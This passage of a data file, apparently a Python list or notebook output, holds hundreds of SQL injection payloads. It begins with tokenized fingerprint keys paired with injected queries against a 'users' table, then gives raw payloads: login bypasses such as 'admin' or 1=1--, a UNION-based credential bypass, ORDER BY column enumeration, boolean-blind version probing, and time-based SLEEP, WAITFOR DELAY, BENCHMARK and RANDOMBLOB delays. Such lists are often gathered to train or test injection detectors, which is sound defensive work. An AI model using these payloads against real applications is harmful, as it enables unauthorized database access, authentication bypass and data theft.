       " 's:?s: select * from users where id = 1 or \":]\" or 1 = 1 -- 1',\n",
       " 's:UE1: select * from users where id = 1 or 1#\": union select 1,version (  )  -- 1',\n",
       " 's:UEf: select * from users where id = 1 or 1#\": union select version (  ) ,version (  )  -- 1',\n",
       " 's:UEs: select * from users where id = 1 or 1#\": union select \\'a\\',version (  )  -- 1',\n",
       " 's:UEv: select * from users where id = 1 or 1#\": union select null,version (  )  -- 1',\n",
       " 's:c: select * from users where id = 1 or \":#\" or 1 = 1 -- 1',\n",
       " 's:n: select * from users where id = 1 or \":[\" or 1 = 1 -- 1',\n",
       " 's:ns: select * from users where id = 1 or \":$\" or 1 = 1 -- 1',\n",
       " 's:os: select * from users where id = 1 or \":%\" or 1 = 1 -- 1',\n",
       " 's:s: select * from users where id = \\'1\\' union select \":\"_,version (  )  -- 1\\'',\n",
       " 's:v: select * from users where id = 1 or \":@\" or 1 = 1 -- 1',\n",
       " 's:{s: select * from users where id = 1 or \":{\" or 1 = 1 -- 1',\n",
       " 's;&1c: select * from users where id = 1 or 1#\"; or 1 = 1 -- 1',\n",
       " 's; ( s: select * from users where id = 1 or \"; ( \" or 1 = 1 -- 1',\n",
       " 's; ) s: select * from users where id = 1 or \"; ) \" = 1 or 1 = 1 -- 1',\n",
       " 's;,s: select * from users where id = 1 or \";,\" = 1 or 1 = 1 -- 1',\n",
       " 's;.s: select * from users where id = 1 or \";.\" = 1 or 1 = 1 -- 1',\n",
       " 's;1s: select * from users where id = 1 or \";1\" or 1 = 1 -- 1',\n",
       " 's;:s: select * from users where id = 1 or \";:\" = 1 or 1 = 1 -- 1',\n",
       " 's;?s: select * from users where id = 1 or \";]\" or 1 = 1 -- 1',\n",
       " 's;UE1: select * from users where id = 1 or 1#\"; union select 1,version (  )  -- 1',\n",
       " 's;UEf: select * from users where id = 1 or 1#\"; union select version (  ) ,version (  )  -- 1',\n",
       " 's;UEs: select * from users where id = 1 or 1#\"; union select \\'a\\',version (  )  -- 1',\n",
       " 's;UEv: select * from users where id = 1 or 1#\"; union select null,version (  )  -- 1',\n",
       " 's;c: select * from users where id = 1 or \";#\" or 1 = 1 -- 1',\n",
       " 's;n: select * from users where id = 1 or \";[\" or 1 = 1 -- 1',\n",
       " 's;ns: select * from users where id = 1 or \";_\" or 1 = 1 -- 1',\n",
       " 's;o1&: select * from users where id = 1 or @#\"; = 1 or 1 = 1 -- 1',\n",
       " 's;o1U: select * from users where id = 1 or 1#\"; = 1 union select 1,version (  )  -- 1',\n",
       " 's;os: select * from users where id = 1 or \";&\" or 1 = 1 -- 1',\n",
       " 's;s: select * from users where id = \\'1\\' union select \";\"_,version (  )  -- 1\\'',\n",
       " 's;v: select * from users where id = 1 or \";@\" or 1 = 1 -- 1',\n",
       " 's;{s: select * from users where id = 1 or \";{\" or 1 = 1 -- 1',\n",
       " 's?&1c: select * from users where id = 1 or 1#\"? or 1 = 1 -- 1',\n",
       " 's? ( s: select * from users where id = 1 or \"? ( \" or 1 = 1 -- 1',\n",
       " 's? ) s: select * from users where id = 1 or \"] ) \" or 1 = 1 -- 1',\n",
       " 's?,s: select * from users where id = 1 or \"?,\" or 1 = 1 -- 1',\n",
       " 's?,vc: select * from users where id = \\'1\\' union select $[\"],@@VERSION -- 1\\'',\n",
       " 's?.s: select * from users where id = 1 or \"].\" or 1 = 1 -- 1',\n",
       " 's?1s: select * from users where id = 1 or \"]1\" or 1 = 1 -- 1',\n",
       " 's?:s: select * from users where id = 1 or \"]:\" or 1 = 1 -- 1',\n",
       " 's?;s: select * from users where id = 1 or \"?;\" or 1 = 1 -- 1',\n",
       " 's??s: select * from users where id = 1 or \"??\" or 1 = 1 -- 1',\n",
       " 's?UE1: select * from users where id = 1 or 1#\"? union select 1,version (  )  -- 1',\n",
       " 's?UEf: select * from users where id = 1 or 1#\"? union select version (  ) ,version (  )  -- 1',\n",
       " 's?UEs: select * from users where id = 1 or 1#\"? union select \\'a\\',version (  )  -- 1',\n",
       " 's?UEv: select * from users where id = 1 or 1#\"? union select null,version (  )  -- 1',\n",
       " 's?c: select * from users where id = 1 or \"?#\" or 1 = 1 -- 1',\n",
       " 's?n: select * from users where id = 1 or \"?[\" or 1 = 1 -- 1',\n",
       " 's?ns: select * from users where id = 1 or \"?_\" or 1 = 1 -- 1',\n",
       " 's?o1&: select * from users where id = 1 or 1#\"? = 1 or 1 = 1 -- 1',\n",
       " 's?o1U: select * from users where id = 1 or 1#\"? = 1 union select 1,version (  )  -- 1',\n",
       " 's?os: select * from users where id = 1 or \"?%\" or 1 = 1 -- 1',\n",
       " 's?s: select * from users where id = \\'1\\' union select \"?\"_,version (  )  -- 1\\'',\n",
       " 's?v: select * from users where id = 1 or \"?@\" or 1 = 1 -- 1',\n",
       " 's?{s: select * from users where id = 1 or \"]{\" or 1 = 1 -- 1',\n",
       " \"sUE&o: select * from users where id = '1' union select ||/1,version (  )  -- 1'\",\n",
       " \"sUE (  ) : select * from users where id = '1' union select  ( \\\\ ) ,@@VERSION -- 1'\",\n",
       " \"sUE ( .: select * from users where id = '1' union select  ( \\\\. ) ,@@VERSION -- 1'\",\n",
       " \"sUE ( 1: select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'\",\n",
       " \"sUE,v: select * from users where id = '1' union select \\\\,@@VERSION -- 1'\",\n",
       " \"sUE.,: select * from users where id = '1' union select \\\\.,@@VERSION -- 1'\",\n",
       " \"sUE.c: select * from users where id = '1' union select \\\\.#,@@VERSION -- 1'\",\n",
       " \"sUE.o: select * from users where id = '1' union select \\\\.%1,@@VERSION -- 1'\",\n",
       " \"sUE1k: select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \"sUE1n: select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'\",\n",
       " 'sUE1s: select * from users where id = \\'1\\' union select 1\"!\",banner from v$version where rownum = 1 -- 1\\'',\n",
       " \"sUE\\\\c: select * from users where id = '1' union select \\\\#,@@VERSION -- 1'\",\n",
       " \"sUEn.: select * from users where id = '1' union select $ .,@@VERSION -- 1'\",\n",
       " \"sUEnn: select * from users where id = '1' union select $ _,@@VERSION -- 1'\",\n",
       " \"sUEnv: select * from users where id = '1' union select $*$,@@VERSION -- 1'\",\n",
       " \"sUEo,: select * from users where id = '1' union select +\\\\,@@VERSION -- 1'\",\n",
       " \"sUEo.: select * from users where id = '1' union select +\\\\.,@@VERSION -- 1'\",\n",
       " \"sUEo1: select * from users where id = '1' union select !<1,version (  )  -- 1'\",\n",
       " \"sUEo\\\\: select * from users where id = '1' union select +\\\\#,@@VERSION -- 1'\",\n",
       " \"sUEov: select * from users where id = '1' union select !<@,version (  )  -- 1'\",\n",
       " \"sUEv1: select * from users where id = '1' union select @ 1,version (  )  --  1'\",\n",
       " \"sUEvk: select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'\",\n",
       " \"sUEvv: select * from users where id = '1' union select @ @1,version (  )  --  1'\",\n",
       " 's\\\\c: select * from users where id = 1 or \"\\\\#\" or 1 = 1 -- 1',\n",
       " 'sn ( s: select * from users where id = 1 or \"$ ( \" or 1 = 1 -- 1',\n",
       " 'sn ) s: select * from users where id = 1 or \"_ ) \" or 1 = 1 -- 1',\n",
       " 'sn: select * from users where id = \\'1\\' union select \"[\"_,version (  )  -- 1\\'',\n",
       " 'sn:s: select * from users where id = 1 or \"$:\" or 1 = 1 -- 1',\n",
       " 'sn;s: select * from users where id = 1 or \"_;\" or 1 = 1 -- 1',\n",
       " 'sn?s: select * from users where id = 1 or \"$?\" or 1 = 1 -- 1',\n",
       " 'snUE1: select * from users where id = 1 or 1#\"$ union select 1,version (  )  -- 1',\n",
       " 'snUEf: select * from users where id = 1 or 1#\"$ union select version (  ) ,version (  )  -- 1',\n",
       " 'snUEs: select * from users where id = 1 or 1#\"$ union select \\'a\\',version (  )  -- 1',\n",
       " 'snUEv: select * from users where id = 1 or 1#\"$ union select null,version (  )  -- 1',\n",
       " 'snc: select * from users where id = 1 or \"$#\" or 1 = 1 -- 1',\n",
       " 'snn: select * from users where id = 1 or \"$[\" or 1 = 1 -- 1',\n",
       " 'snns: select * from users where id = 1 or \"$_\" or 1 = 1 -- 1',\n",
       " 'snos: select * from users where id = 1 or \"$&\" or 1 = 1 -- 1',\n",
       " 'snv: select * from users where id = 1 or \"$@\" or 1 = 1 -- 1',\n",
       " 'sn{s: select * from users where id = 1 or \"_{\" or 1 = 1 -- 1',\n",
       " \"so (  ) &: select * from users where id = '1' * ( \\\\ )  or 1 = 1 -- 1'\",\n",
       " \"so (  ) U: select * from users where id = '1' +  ( \\\\ )  union select 1,@@VERSION -- 1'\",\n",
       " \"so ( . ) : select * from users where id = '1' +  ( \\\\. )  union select 1,@@VERSION -- 1'\",\n",
       " \"so ( 1 ) : select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " 'so ( s: select * from users where id = 1 or \"& ( \" or 1 = 1 -- 1',\n",
       " 'so ) s: select * from users where id = 1 or \"& ) \" or 1 = 1 -- 1',\n",
       " 'so,s: select * from users where id = 1 or \"%,\" or 1 = 1 -- 1',\n",
       " \"so..&: select * from users where id = '1'<@.. or 1 = 1 -- 1'\",\n",
       " \"so..U: select * from users where id = '1'<@.. union select 1,version (  )  -- 1'\",\n",
       " \"so.n&: select * from users where id = '1' <@.$ or 1 = 1 -- 1'\",\n",
       " \"so.nU: select * from users where id = '1' <@._ union select 1,version (  )  -- 1'\",\n",
       " 'so.s: select * from users where id = 1 or \"%.\" or 1 = 1 -- 1',\n",
       " \"so1&1: select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \"so1UE: select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " 'so1s: select * from users where id = 1 or \"%1\" or 1 = 1 -- 1',\n",
       " 'so:s: select * from users where id = 1 or \"&:\" or 1 = 1 -- 1',\n",
       " 'so;s: select * from users where id = 1 or \"%;\" or 1 = 1 -- 1',\n",
       " 'so?s: select * from users where id = 1 or \"%?\" or 1 = 1 -- 1',\n",
       " \"soc: select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'\",\n",
       " \"son.&: select * from users where id = '1' *$ . or 1 = 1 -- 1'\",\n",
       " \"son.U: select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'\",\n",
       " \"son1&: select * from users where id = '1' *$ 1 or 1 = 1 -- 1'\",\n",
       " 'son: select * from users where id = 1 or \"%[\" or 1 = 1 -- 1',\n",
       " \"sonn&: select * from users where id = '1' <@$_ or 1 = 1 -- 1'\",\n",
       " \"sonnU: select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'\",\n",
       " 'sons: select * from users where id = 1 or \"%_\" or 1 = 1 -- 1',\n",
       " \"soo&1: select * from users where id = '1' + $+%\\\\ or 1 = 1 -- 1'\",\n",
       " \"soo1&: select * from users where id = '1' <@&1 or 1 = 1 -- 1'\",\n",
       " \"soo1U: select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'\",\n",
       " \"sooUE: select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'\",\n",
       " \"soon&: select * from users where id = '1' + $+%$ or 1 = 1 -- 1'\",\n",
       " \"soonU: select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'\",\n",
       " 'soos: select * from users where id = 1 or \"%&\" or 1 = 1 -- 1',\n",
       " \"soov&: select * from users where id = '1' <@&@ or 1 = 1 -- 1'\",\n",
       " \"soovU: select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'\",\n",
       " \"sos: select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'\",\n",
       " \"sov ( 1: select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'\",\n",
       " \"sov1U: select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'\",\n",
       " \"sov1o: select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'\",\n",
       " \"sovvU: select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'\",\n",
       " 'so{s: select * from users where id = 1 or \"%{\" or 1 = 1 -- 1',\n",
       " 'sv ( s: select * from users where id = 1 or \"@ ( \" or 1 = 1 -- 1',\n",
       " 'sv ) s: select * from users where id = 1 or \"@ ) \" or 1 = 1 -- 1',\n",
       " 'sv:s: select * from users where id = 1 or \"@:\" = 1 or 1 = 1 -- 1',\n",
       " 'sv;s: select * from users where id = 1 or \"@;\" = 1 or 1 = 1 -- 1',\n",
       " 'sv?s: select * from users where id = 1 or \"@?\" or 1 = 1 -- 1',\n",
       " 'svUE1: select * from users where id = 1 or 1#\"@ union select 1,version (  )  -- 1',\n",
       " 'svUEf: select * from users where id = 1 or 1#\"@ union select version (  ) ,version (  )  -- 1',\n",
       " 'svUEs: select * from users where id = 1 or 1#\"@ union select \\'a\\',version (  )  -- 1',\n",
       " 'svUEv: select * from users where id = 1 or 1#\"@ union select null,version (  )  -- 1',\n",
       " 'svc: select * from users where id = 1 or \"@#\" or 1 = 1 -- 1',\n",
       " 'svos: select * from users where id = 1 or \"@%\" or 1 = 1 -- 1',\n",
       " 's{ ( s: select * from users where id = 1 or \"{ ( \" = 1 or 1 = 1 -- 1',\n",
       " 's{ ) s: select * from users where id = 1 or \"{ ) \" or 1 = 1 -- 1',\n",
       " 's{,s: select * from users where id = 1 or \"{,\" = 1 or 1 = 1 -- 1',\n",
       " 's{.s: select * from users where id = 1 or \"{.\" or 1 = 1 -- 1',\n",
       " 's{1s: select * from users where id = 1 or \"{1\" = 1 or 1 = 1 -- 1',\n",
       " 's{:s: select * from users where id = 1 or \"{:\" or 1 = 1 -- 1',\n",
       " 's{;s: select * from users where id = 1 or \"{;\" or 1 = 1 -- 1',\n",
       " 's{?s: select * from users where id = 1 or \"{?\" or 1 = 1 -- 1',\n",
       " 's{UE1: select * from users where id = 1 or 1#\"{ union select 1,version (  )  -- 1',\n",
       " 's{UEf: select * from users where id = 1 or 1#\"{ union select version (  ) ,version (  )  -- 1',\n",
       " 's{UEs: select * from users where id = 1 or 1#\"{ union select \\'a\\',version (  )  -- 1',\n",
       " 's{UEv: select * from users where id = 1 or 1#\"{ union select null,version (  )  -- 1',\n",
       " 's{c: select * from users where id = 1 or \"{#\" or 1 = 1 -- 1',\n",
       " 's{o1&: select * from users where id = 1 or @#\"{ = 1 or 1 = 1 -- 1',\n",
       " 's{o1U: select * from users where id = 1 or @#\"{ = 1 union select 1,version (  )  -- 1',\n",
       " 's{os: select * from users where id = 1 or \"{%\" or 1 = 1 -- 1',\n",
       " 's{v: select * from users where id = 1 or \"{@\" or 1 = 1 -- 1',\n",
       " 's{{s: select * from users where id = 1 or \"{{\" or 1 = 1 -- 1',\n",
       " 'v: select * from users where id = 1 + @`\\\\` union select 1,version (  )  -- 1',\n",
       " 'vc: select * from users where id = 1 + @<1# union select 1,version (  )  -- 1',\n",
       " 'vo.UE: select * from users where id = 1 + @<@. union select 1,version (  )  -- 1',\n",
       " 'voUE1: select * from users where id = 1 -@<@ union select 1,version (  )  -- 1',\n",
       " 'voUEf: select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1',\n",
       " 'voUEv: select * from users where id = 1 -@<@ union select null,version (  )  -- 1',\n",
       " 'voc: select * from users where id = 1 + @<@# union select null,version (  )  -- 1',\n",
       " \"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"',\n",
       " '\" or \"\"-\"',\n",
       " '\" or \"\" \"',\n",
       " '\" or \"\"&\"',\n",
       " '\" or \"\"^\"',\n",
       " '\" or \"\"*\"',\n",
       " 'or true--',\n",
       " '\" or true--',\n",
       " \"' or true--\",\n",
       " '\" )  or true--',\n",
       " \"' )  or true--\",\n",
       " \"' or 'x' = 'x\",\n",
       " \"' )  or  ( 'x' )  =  ( 'x\",\n",
       " \"'  )  )   or   (  (  'x'  )  )   =   (  (  'x\",\n",
       " '\" or \"x\" = \"x',\n",
       " '\" )  or  ( \"x\" )  =  ( \"x',\n",
       " '\"  )  )   or   (  (  \"x\"  )  )   =   (  (  \"x',\n",
       " 'or 1 = 1',\n",
       " 'or 1 = 1-- ',\n",
       " 'or 1 = 1#',\n",
       " 'or 1 = 1/*',\n",
       " \"admin' --\",\n",
       " \"admin' #\",\n",
       " \"admin'/*\",\n",
       " \"admin' or '1' = '1\",\n",
       " \"admin' or '1' = '1'--\",\n",
       " \"admin' or '1' = '1'#\",\n",
       " \"admin' or '1' = '1'/*\",\n",
       " \"admin'or 1 = 1 or '' = '\",\n",
       " \"admin' or 1 = 1\",\n",
       " \"admin' or 1 = 1--\",\n",
       " \"admin' or 1 = 1#\",\n",
       " \"admin' or 1 = 1/*\",\n",
       " \"admin' )  or  ( '1' = '1\",\n",
       " \"admin' )  or  ( '1' = '1'--\",\n",
       " \"admin' )  or  ( '1' = '1'#\",\n",
       " \"admin' )  or  ( '1' = '1'/*\",\n",
       " \"admin' )  or '1' = '1\",\n",
       " \"admin' )  or '1' = '1'--\",\n",
       " \"admin' )  or '1' = '1'#\",\n",
       " \"admin' )  or '1' = '1'/*\",\n",
       " \"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\",\n",
       " 'admin\" --',\n",
       " 'admin\" #',\n",
       " 'admin\"/*',\n",
       " 'admin\" or \"1\" = \"1',\n",
       " 'admin\" or \"1\" = \"1\"--',\n",
       " 'admin\" or \"1\" = \"1\"#',\n",
       " 'admin\" or \"1\" = \"1\"/*',\n",
       " 'admin\"or 1 = 1 or \"\" = \"',\n",
       " 'admin\" or 1 = 1',\n",
       " 'admin\" or 1 = 1--',\n",
       " 'admin\" or 1 = 1#',\n",
       " 'admin\" or 1 = 1/*',\n",
       " 'admin\" )  or  ( \"1\" = \"1',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"--',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"#',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"/*',\n",
       " 'admin\" )  or \"1\" = \"1',\n",
       " 'admin\" )  or \"1\" = \"1\"--',\n",
       " 'admin\" )  or \"1\" = \"1\"#',\n",
       " 'admin\" )  or \"1\" = \"1\"/*',\n",
       " '1234 \" AND 1 = 0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055',\n",
       " ' OR 1 = 1',\n",
       " ' OR 1 = 0',\n",
       " ' OR x = x',\n",
       " ' OR x = y',\n",
       " ' OR 1 = 1#',\n",
       " ' OR 1 = 0#',\n",
       " ' OR x = x#',\n",
       " ' OR x = y#',\n",
       " ' OR 1 = 1-- ',\n",
       " ' OR 1 = 0-- ',\n",
       " ' OR x = x-- ',\n",
       " ' OR x = y-- ',\n",
       " \" OR 3409 = 3409 AND  ( 'pytW' LIKE 'pytW\",\n",
       " \" OR 3409 = 3409 AND  ( 'pytW' LIKE 'pytY\",\n",
       " ' HAVING 1 = 1',\n",
       " ' HAVING 1 = 0',\n",
       " ' HAVING 1 = 1#',\n",
       " ' HAVING 1 = 0#',\n",
       " ' HAVING 1 = 1-- ',\n",
       " ' HAVING 1 = 0-- ',\n",
       " ' AND 1 = 1',\n",
       " ' AND 1 = 0',\n",
       " ' AND 1 = 1-- ',\n",
       " ' AND 1 = 0-- ',\n",
       " ' AND 1 = 1#',\n",
       " ' AND 1 = 0#',\n",
       " \" AND 1 = 1 AND '%' = '\",\n",
       " \" AND 1 = 0 AND '%' = '\",\n",
       " ' AND 1083 = 1083 AND  ( 1427 = 1427',\n",
       " ' AND 7506 = 9091 AND  ( 5913 = 5913',\n",
       " \" AND 1083 = 1083 AND  ( '1427 = 1427\",\n",
       " \" AND 7506 = 9091 AND  ( '5913 = 5913\",\n",
       " \" AND 7300 = 7300 AND 'pKlZ' = 'pKlZ\",\n",
       " \" AND 7300 = 7300 AND 'pKlZ' = 'pKlY\",\n",
       " \" AND 7300 = 7300 AND  ( 'pKlZ' = 'pKlZ\",\n",
       " \" AND 7300 = 7300 AND  ( 'pKlZ' = 'pKlY\",\n",
       " ' AS INJECTX WHERE 1 = 1 AND 1 = 1',\n",
       " ' AS INJECTX WHERE 1 = 1 AND 1 = 0',\n",
       " ' AS INJECTX WHERE 1 = 1 AND 1 = 1#',\n",
       " ' AS INJECTX WHERE 1 = 1 AND 1 = 0#',\n",
       " ' AS INJECTX WHERE 1 = 1 AND 1 = 1--',\n",
       " ' AS INJECTX WHERE 1 = 1 AND 1 = 0--',\n",
       " ' WHERE 1 = 1 AND 1 = 1',\n",
       " ' WHERE 1 = 1 AND 1 = 0',\n",
       " ' WHERE 1 = 1 AND 1 = 1#',\n",
       " ' WHERE 1 = 1 AND 1 = 0#',\n",
       " ' WHERE 1 = 1 AND 1 = 1--',\n",
       " ' WHERE 1 = 1 AND 1 = 0--',\n",
       " ' ORDER BY 1-- ',\n",
       " ' ORDER BY 2-- ',\n",
       " ' ORDER BY 3-- ',\n",
       " ' ORDER BY 4-- ',\n",
       " ' ORDER BY 5-- ',\n",
       " ' ORDER BY 6-- ',\n",
       " ' ORDER BY 7-- ',\n",
       " ' ORDER BY 8-- ',\n",
       " ' ORDER BY 9-- ',\n",
       " ' ORDER BY 10-- ',\n",
       " ' ORDER BY 11-- ',\n",
       " ' ORDER BY 12-- ',\n",
       " ' ORDER BY 13-- ',\n",
       " ' ORDER BY 14-- ',\n",
       " ' ORDER BY 15-- ',\n",
       " ' ORDER BY 16-- ',\n",
       " ' ORDER BY 17-- ',\n",
       " ' ORDER BY 18-- ',\n",
       " ' ORDER BY 19-- ',\n",
       " ' ORDER BY 20-- ',\n",
       " ' ORDER BY 21-- ',\n",
       " ' ORDER BY 22-- ',\n",
       " ' ORDER BY 23-- ',\n",
       " ' ORDER BY 24-- ',\n",
       " ' ORDER BY 25-- ',\n",
       " ' ORDER BY 26-- ',\n",
       " ' ORDER BY 27-- ',\n",
       " ' ORDER BY 28-- ',\n",
       " ' ORDER BY 29-- ',\n",
       " ' ORDER BY 30-- ',\n",
       " ' ORDER BY 31337-- ',\n",
       " ' ORDER BY 1# ',\n",
       " ' ORDER BY 2# ',\n",
       " ' ORDER BY 3# ',\n",
       " ' ORDER BY 4# ',\n",
       " ' ORDER BY 5# ',\n",
       " ' ORDER BY 6# ',\n",
       " ' ORDER BY 7# ',\n",
       " ' ORDER BY 8# ',\n",
       " ' ORDER BY 9# ',\n",
       " ' ORDER BY 10# ',\n",
       " ' ORDER BY 11# ',\n",
       " ' ORDER BY 12# ',\n",
       " ' ORDER BY 13# ',\n",
       " ' ORDER BY 14# ',\n",
       " ' ORDER BY 15# ',\n",
       " ' ORDER BY 16# ',\n",
       " ' ORDER BY 17# ',\n",
       " ' ORDER BY 18# ',\n",
       " ' ORDER BY 19# ',\n",
       " ' ORDER BY 20# ',\n",
       " ' ORDER BY 21# ',\n",
       " ' ORDER BY 22# ',\n",
       " ' ORDER BY 23# ',\n",
       " ' ORDER BY 24# ',\n",
       " ' ORDER BY 25# ',\n",
       " ' ORDER BY 26# ',\n",
       " ' ORDER BY 27# ',\n",
       " ' ORDER BY 28# ',\n",
       " ' ORDER BY 29# ',\n",
       " ' ORDER BY 30#',\n",
       " ' ORDER BY 31337#',\n",
       " ' ORDER BY 1 ',\n",
       " ' ORDER BY 2 ',\n",
       " ' ORDER BY 3 ',\n",
       " ' ORDER BY 4 ',\n",
       " ' ORDER BY 5 ',\n",
       " ' ORDER BY 6 ',\n",
       " ' ORDER BY 7 ',\n",
       " ' ORDER BY 8 ',\n",
       " ' ORDER BY 9 ',\n",
       " ' ORDER BY 10 ',\n",
       " ' ORDER BY 11 ',\n",
       " ' ORDER BY 12 ',\n",
       " ' ORDER BY 13 ',\n",
       " ' ORDER BY 14 ',\n",
       " ' ORDER BY 15 ',\n",
       " ' ORDER BY 16 ',\n",
       " ' ORDER BY 17 ',\n",
       " ' ORDER BY 18 ',\n",
       " ' ORDER BY 19 ',\n",
       " ' ORDER BY 20 ',\n",
       " ' ORDER BY 21 ',\n",
       " ' ORDER BY 22 ',\n",
       " ' ORDER BY 23 ',\n",
       " ' ORDER BY 24 ',\n",
       " ' ORDER BY 25 ',\n",
       " ' ORDER BY 26 ',\n",
       " ' ORDER BY 27 ',\n",
       " ' ORDER BY 28 ',\n",
       " ' ORDER BY 29 ',\n",
       " ' ORDER BY 30 ',\n",
       " ' ORDER BY 31337 ',\n",
       " \" RLIKE  ( SELECT  ( CASE WHEN  ( 4346 = 4346 )  THEN 0x61646d696e ELSE 0x28 END  )  )   AND 'Txws' = '\",\n",
       " \" RLIKE  ( SELECT  ( CASE WHEN  ( 4346 = 4347 )  THEN 0x61646d696e ELSE 0x28 END  )  )   AND 'Txws' = '\",\n",
       " 'IF ( 7423 = 7424 )  SELECT 7423 ELSE DROP FUNCTION xcjl--',\n",
       " 'IF ( 7423 = 7423 )  SELECT 7423 ELSE DROP FUNCTION xcjl--',\n",
       " \"%' AND 8310 = 8310 AND '%' = '\",\n",
       " \"%' AND 8310 = 8311 AND '%' = '\",\n",
       " \" and  ( select substring ( @@version,1,1  )  )   = 'X'\",\n",
       " \" and  ( select substring ( @@version,1,1  )  )   = 'M'\",\n",
       " \" and  ( select substring ( @@version,2,1  )  )   = 'i'\",\n",
       " \" and  ( select substring ( @@version,2,1  )  )   = 'y'\",\n",
       " \" and  ( select substring ( @@version,3,1  )  )   = 'c'\",\n",
       " \" and  ( select substring ( @@version,3,1  )  )   = 'S'\",\n",
       " \" and  ( select substring ( @@version,3,1  )  )   = 'X'\",\n",
       " \" AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) bAKL )  AND 'vRxe' = 'vRxe\",\n",
       " \" AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) YjoC )  AND '%' = '\",\n",
       " ' AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) nQIP ) ',\n",
       " ' AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) nQIP ) --',\n",
       " ' AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) nQIP ) #',\n",
       " 'SLEEP ( 5 ) #',\n",
       " 'SLEEP ( 5 ) -- ',\n",
       " 'SLEEP ( 5 )  = \"',\n",
       " \"SLEEP ( 5 )  = '\",\n",
       " ' or SLEEP ( 5 ) ',\n",
       " ' or SLEEP ( 5 ) #',\n",
       " ' or SLEEP ( 5 ) --',\n",
       " ' or SLEEP ( 5 )  = \"',\n",
       " \" or SLEEP ( 5 )  = '\",\n",
       " \"waitfor delay '00:00:05'\",\n",
       " \"waitfor delay '00:00:05'-- \",\n",
       " \"waitfor delay '00:00:05'#\",\n",
       " 'benchmark ( 50000000,MD5 ( 1  )  )  ',\n",
       " 'benchmark ( 50000000,MD5 ( 1  )  )  -- ',\n",
       " 'benchmark ( 50000000,MD5 ( 1  )  )  #',\n",
       " ' or benchmark ( 50000000,MD5 ( 1  )  )  ',\n",
       " ' or benchmark ( 50000000,MD5 ( 1  )  )  -- ',\n",
       " ' or benchmark ( 50000000,MD5 ( 1  )  )  #',\n",
       " 'pg_SLEEP ( 5 ) ',\n",
       " 'pg_SLEEP ( 5 ) -- ',\n",
       " 'pg_SLEEP ( 5 ) #',\n",
       " ' or pg_SLEEP ( 5 ) ',\n",
       " ' or pg_SLEEP ( 5 ) -- ',\n",
       " ' or pg_SLEEP ( 5 ) #',\n",
       " '\\'\\\\\"',\n",
       " ' AnD SLEEP ( 5 ) ',\n",
       " ' AnD SLEEP ( 5 ) --',\n",
       " ' AnD SLEEP ( 5 ) #',\n",
       " '&&SLEEP ( 5 ) ',\n",
       " '&&SLEEP ( 5 ) --',\n",
       " '&&SLEEP ( 5 ) #',\n",
       " \"' AnD SLEEP ( 5 )  ANd '1\",\n",
       " \"'&&SLEEP ( 5 ) &&'1\",\n",
       " ' ORDER BY SLEEP ( 5 ) ',\n",
       " ' ORDER BY SLEEP ( 5 ) -- ',\n",
       " ' ORDER BY SLEEP ( 5 ) #',\n",
       " ' ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) ecMj ) ',\n",
       " ' ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) ecMj ) #',\n",
       " ' ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) ecMj ) --',\n",
       " \"+benchmark ( 3200,SHA1 ( 1  )  )  +'\",\n",
       " \" + SLEEP ( 10 )  + '\",\n",
       " ' RANDOMBLOB ( 500000000/2 ) ',\n",
       " \" AND 2947 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2  )  )    )  )  \",\n",
       " \" OR 2947 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2  )  )    )  )  \",\n",
       " ' RANDOMBLOB ( 1000000000/2 ) ',\n",
       " \" AND 2947 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 1000000000/2  )  )    )  )  \",\n",
       " \" OR 2947 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 1000000000/2  )  )    )  )  \",\n",
       " ' SLEEP ( 1 ) /*\\' or SLEEP ( 1 )  or \\'\" or SLEEP ( 1 )  or \"*/',\n",
       " ' ORDER BY SLEEP ( 5 ) ',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) ',\n",
